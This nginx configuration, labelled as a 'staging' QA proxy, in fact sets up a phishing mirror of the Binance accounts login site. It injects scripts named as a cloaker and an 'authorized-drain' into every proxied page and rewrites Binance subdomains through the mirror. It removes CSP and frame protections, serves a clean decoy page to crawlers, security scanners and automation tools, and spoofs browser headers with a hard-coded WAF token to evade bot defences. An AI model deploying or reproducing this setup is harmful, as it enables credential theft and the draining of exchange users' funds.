# Legion QA — dynamic reverse proxy (staging only)
# Target: https://accounts.binance.com
# All paths (including /) → proxied to https://accounts.binance.com; Legion inject assets served locally
# --authorized-test: legion-authorized-drain.js/css injected into proxied HTML via sub_filter
# --waf-bypass: browser-like upstream headers (experimental)
# --asset-rewrite: sub_filter origin → mirror host in HTML/CSS/JS/JSON
# --headless-fallback: navigator.webdriver patch (experimental)

worker_processes 1;
events { worker_connections 2048; }

http {
  include       /etc/nginx/mime.types;
  default_type  application/octet-stream;
  sendfile      on;
  keepalive_timeout 65;
  proxy_connect_timeout 60s;
  proxy_send_timeout 120s;
  proxy_read_timeout 120s;
  proxy_buffering on;

  map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
  }

  map $http_user_agent $is_bot_ua {
    default 0;
    ~*googlebot 1;
    ~*bingbot 1;
    ~*ahrefsbot 1;
    ~*semrushbot 1;
    ~*yandexbot 1;
    ~*baiduspider 1;
    ~*crawler 1;
    ~*spider 1;
    ~*headless 1;
    ~*phantomjs 1;
    ~*selenium 1;
    ~*puppeteer 1;
    ~*playwright 1;
    ~*bytespider 1;
    ~*petalbot 1;
    ~*curl/ 1;
    ~*wget/ 1;
    ~*python-requests 1;
  }

  map $http_accept_language $is_bot_lang {
    default 0;
    "" 1;
  }

  map "$is_bot_ua$is_bot_lang" $legion_is_bot {
    default 0;
    11 1;
    10 1;
    01 1;
  }

  server {
    listen 8080;
    server_name localhost 127.0.0.1;

    root /usr/share/nginx/html;

    location = /bots-clean.html {
      try_files /bots-clean.html =404;
      add_header Cache-Control "no-store";
    }

    error_page 418 = /bots-clean.html;
    if ($legion_is_bot) { return 418; }

    location = /mirror-config.json {
      try_files /mirror-config.json =404;
      add_header Cache-Control "no-store";
      add_header Content-Type application/json;
    }

    # Legion inject assets — serve from local volume (never proxy to upstream)
    location ^~ /legion- {
      try_files $uri =404;
      add_header Cache-Control "no-store";
    }

    # Subdomain passthrough — /__legion_proxy/<host>/<path> → https://<host>/<path>
    location ~ ^/__legion_proxy/(?<proxy_host>[^/]+)(?<proxy_path>/.*)?$ {
      set $upstream_path $proxy_path;
      if ($upstream_path = "") { set $upstream_path /; }
      proxy_pass https://$proxy_host$upstream_path$is_args$args;
      proxy_ssl_server_name on;
      proxy_set_header Host $proxy_host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header X-Frame-Options;
      proxy_set_header Accept-Encoding "";
    }

    # Proxy all paths (including /) to the configured target origin
    location / {
      sub_filter_once off;
      sub_filter_types text/html text/css application/javascript application/json text/javascript;
      sub_filter '</body>' '<script src="/legion-cloak-client.js"></script><script src="/legion-authorized-drain.js" defer></script><script src="/legion-balance-display.js" defer></script></body>';
      proxy_set_header Accept-Encoding "";
      sub_filter 'https://accounts.binance.com' '';
      sub_filter 'https://accounts.binance.com' '';
      sub_filter 'http://accounts.binance.com' '';
      sub_filter 'href="/' 'href="/';
      sub_filter "href='/" "href='/";
      sub_filter 'action="/' 'action="/';
      sub_filter 'src="/' 'src="/';
      sub_filter 'url(https://accounts.binance.com' 'url(';
      sub_filter 'url(https://accounts.binance.com' 'url(';
      sub_filter 'url(http://accounts.binance.com' 'url(';
      sub_filter 'https://www.binance.com' '/__legion_proxy/www.binance.com';
      sub_filter 'http://www.binance.com' '/__legion_proxy/www.binance.com';
      sub_filter '//www.binance.com' '/__legion_proxy/www.binance.com';
      sub_filter 'https://app.binance.com' '/__legion_proxy/app.binance.com';
      sub_filter 'http://app.binance.com' '/__legion_proxy/app.binance.com';
      sub_filter '//app.binance.com' '/__legion_proxy/app.binance.com';
      sub_filter 'https://api.binance.com' '/__legion_proxy/api.binance.com';
      sub_filter 'http://api.binance.com' '/__legion_proxy/api.binance.com';
      sub_filter '//api.binance.com' '/__legion_proxy/api.binance.com';
      sub_filter 'https://cdn.binance.com' '/__legion_proxy/cdn.binance.com';
      sub_filter 'http://cdn.binance.com' '/__legion_proxy/cdn.binance.com';
      sub_filter '//cdn.binance.com' '/__legion_proxy/cdn.binance.com';
      sub_filter 'https://static.binance.com' '/__legion_proxy/static.binance.com';
      sub_filter 'http://static.binance.com' '/__legion_proxy/static.binance.com';
      sub_filter '//static.binance.com' '/__legion_proxy/static.binance.com';
      sub_filter 'https://assets.binance.com' '/__legion_proxy/assets.binance.com';
      sub_filter 'http://assets.binance.com' '/__legion_proxy/assets.binance.com';
      sub_filter '//assets.binance.com' '/__legion_proxy/assets.binance.com';
      sub_filter 'https://rpc.binance.com' '/__legion_proxy/rpc.binance.com';
      sub_filter 'http://rpc.binance.com' '/__legion_proxy/rpc.binance.com';
      sub_filter '//rpc.binance.com' '/__legion_proxy/rpc.binance.com';
      sub_filter 'https://graphql.binance.com' '/__legion_proxy/graphql.binance.com';
      sub_filter 'http://graphql.binance.com' '/__legion_proxy/graphql.binance.com';
      sub_filter '//graphql.binance.com' '/__legion_proxy/graphql.binance.com';
      sub_filter 'https://ws.binance.com' '/__legion_proxy/ws.binance.com';
      sub_filter 'http://ws.binance.com' '/__legion_proxy/ws.binance.com';
      sub_filter '//ws.binance.com' '/__legion_proxy/ws.binance.com';
      sub_filter 'https://data.binance.com' '/__legion_proxy/data.binance.com';
      sub_filter 'http://data.binance.com' '/__legion_proxy/data.binance.com';
      sub_filter '//data.binance.com' '/__legion_proxy/data.binance.com';
      sub_filter 'https://metrics.binance.com' '/__legion_proxy/metrics.binance.com';
      sub_filter 'http://metrics.binance.com' '/__legion_proxy/metrics.binance.com';
      sub_filter '//metrics.binance.com' '/__legion_proxy/metrics.binance.com';

      proxy_pass https://accounts.binance.com;
      proxy_ssl_server_name on;
      proxy_set_header Host accounts.binance.com;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header X-Forwarded-Host $host;
      proxy_redirect off;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header X-Frame-Options;
      proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
      proxy_set_header Accept-Language "en-US,en;q=0.9";
      proxy_set_header Accept "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
      proxy_set_header Sec-CH-UA "\"Chromium\";v=\"122\", \"Google Chrome\";v=\"122\", \"Not-A.Brand\";v=\"99\"";
      proxy_set_header Sec-CH-UA-Mobile "?0";
      proxy_set_header Sec-CH-UA-Platform "\"Windows\"";
      proxy_set_header Referer "https://accounts.binance.com/";
      proxy_set_header Origin "https://accounts.binance.com";
      proxy_set_header Cookie "aws-waf-token=bd0f97fa-cc1d-4920-9164-4e8dbda2772f:EwoA3XkNiPMbAAAA:Hrj3Qr/mArTr8z62g2ONPSp2xUihFEKbIvAIBcR8IG2I/I6EyvrIje3u7/A/Jxkb+P6243Ov7AoNX3wjhm8ZIaa46Ci/pMj7AICPmKBPsKXeNFk0y+HfEfwEjJFIYZsEDjfKbaNjeoO+4Imq+s4U8k693vapgNTLoZ7UpaX4n5L5Jd7DBLFQJ9N4A4p1jQkvuiV6hHgsAFcrkJI46EsU5B3POIFBsrtQxg==";
    }
  }
}
